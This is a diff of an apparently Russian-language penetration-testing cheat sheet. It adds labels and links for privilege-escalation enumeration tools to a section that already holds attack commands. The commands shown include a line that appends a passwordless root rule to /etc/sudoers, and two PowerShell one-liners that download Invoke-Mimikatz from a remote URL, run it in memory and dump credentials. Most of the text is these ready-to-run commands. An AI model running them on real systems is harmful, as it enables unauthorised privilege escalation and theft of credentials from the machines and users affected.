@@ -81,10 +81,17 @@ echo 'user ALL=NOPASSWD: ALL' >> /etc/sudoers
 
 **Windows**
 
+Mimikatz
 ```
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 powershell -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 ```
+LinPEAS
+    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+WinPEAS
+    https://github.com/carlospolop/PEASS-ng/
+
 ## Active Directory
 
 Как получить учётную запись в AD:
